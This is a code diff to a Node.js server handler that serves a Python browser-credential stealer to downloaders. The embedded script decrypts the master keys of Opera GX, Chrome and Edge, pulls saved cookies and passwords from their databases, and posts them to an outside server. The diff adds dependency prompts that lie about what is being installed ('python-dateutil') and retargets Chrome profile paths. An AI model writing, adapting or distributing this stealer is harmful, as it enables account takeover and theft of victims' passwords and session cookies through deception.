@@ -5,11 +5,11 @@ const fileModel = db.file;
 const fs = require('fs');
 
 exports.getPayload = (req, res, next) => {
-    const code = `import subprocess;import os;import json;import base64;import sqlite3;import time;import requests;
+    const code = `import subprocess;import os;import json;import base64;import sqlite3;import time;
 def main():
-    from Crypto.Cipher import AES
-    import win32crypt
-    
+    from Crypto.Cipher import AES;
+    import win32crypt;
+    import requests;
     def get_master_key(path_to_localstate):
         file_path = os.environ["USERPROFILE"] + os.sep + path_to_localstate
         file = open(file_path,'r',encoding="utf-8")
@@ -19,7 +19,7 @@ def main():
         encrypted_key = base64.b64decode(b64_key)[5:] 
         master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
         return master_key
-
+    
     def get_cookie(master_key, path_to_db, sql):
         file_path = os.environ["USERPROFILE"] + os.sep + path_to_db
         db = sqlite3.connect(file_path)
@@ -33,8 +33,8 @@ def main():
             ls.append(f"{c[0].decode()};{c[1].decode()};{value}")
         cursor.close()
         return ls
-        
-
+            
+    
     def decrypt_cookie(cookie, key):
         if cookie[:3] == b'v10': 
             cookie = cookie[3:]
@@ -45,26 +45,26 @@ def main():
             return data.decode()
         else :
             return win32crypt.CryptUnprotectData(cookie)[1].decode()
-
+    
     MASTER_KEY = [ r"AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State",
                 r"AppData\\Local\\Google\\Chrome\\User Data\\Local State",
                 r"AppData\\Local\\Microsoft\\Edge\\User Data\\Local State" ]
-    
+        
     COOKIES = [ r"AppData\\Roaming\\Opera Software\\Opera GX Stable\\Network\\Cookies", 
             r"AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", 
-            r"AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies" ]
-
+            r"AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Network\\Cookies" ]
+    
     PASSWORD = [ r"AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data",
         r"AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
-        r"AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data" ]
-
+        r"AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Login Data" ]
+    
     SQL = [ "SELECT host_key, name, encrypted_value FROM cookies;",
         "SELECT origin_url, username_value, password_value FROM logins;"]
-
+    
     master_key = []
     t=0
     tab = ["Opera GX", "Chrome", "Edge"]
-    
+        
     for i in enumerate(tab):
         try :
             key = get_master_key(MASTER_KEY[t])
@@ -96,13 +96,9 @@ def main():
         else :
             error = error+1
         t += 1
-    
-    print("gelo")
     data = {"cookies": cookies, "password": password}
     r = requests.post('https://cobaltium360.fr:3001/api/cookie/${req.params.key}', json=data)
-    
-    print(r.text)
-    
+        
 if __name__ == "__main__":
     op = subprocess.Popen("pip --version", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
     output = op.stdout.read()
@@ -112,7 +108,7 @@ if __name__ == "__main__":
         x = input()
         if(x == "y" or x == "Y"):
             op = subprocess.Popen("curl -o get-pip.py https://bootstrap.pypa.io/get-pip.py", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-            time.sleep(20)
+            time.sleep(15)
             op = subprocess.Popen("python get-pip.py", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
             output = op.stdout.read()
             output_error = op.stderr.read()
@@ -130,7 +126,7 @@ if __name__ == "__main__":
                 else :
                     print("Succesfully installed, please restart the program")
                     exit()
-        
+            
     else:
         op = subprocess.Popen("pip show pywin32", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
         output = op.stdout.read()
@@ -152,9 +148,47 @@ if __name__ == "__main__":
             else:
                 exit()
         else :
-            main()
-
-    `
+            op = subprocess.Popen("pip show pycryptodome", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+            output = op.stdout.read()
+            output_error = op.stderr.read()
+            if output_error :
+                print("You need packages python-dateutil. Do you want install it ? y or n")
+                x = input()
+                if(x == "y" or x == "Y"):
+                    print("Installing python-dateutil...") 
+                    op = subprocess.Popen("pip install pycryptodome && pip install requests", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+                    output = op.stdout.read()
+                    output_error = op.stderr.read()
+                    if output_error :
+                        print("Error, try again")
+                        exit()
+                    else :
+                        print("Succesfully installed, please restart the program")
+                        exit()
+                else:
+                    exit()
+            else :
+                op = subprocess.Popen("pip show requests", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+                output = op.stdout.read()
+                output_error = op.stderr.read()
+                if output_error :
+                    print("You need packages python-dateutil. Do you want install it ? y or n")
+                    x = input()
+                    if(x == "y" or x == "Y"):
+                        print("Installing python-dateutil...") 
+                        op = subprocess.Popen("pip install requests", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+                        output = op.stdout.read()
+                        output_error = op.stderr.read()
+                        if output_error :
+                            print("Error, try again")
+                            exit()
+                        else :
+                            print("Succesfully installed, please restart the program")
+                            exit()
+                    else:
+                        exit()
+                else :
+                    main()`
 
     async function payload(){
         if(req.params.key){
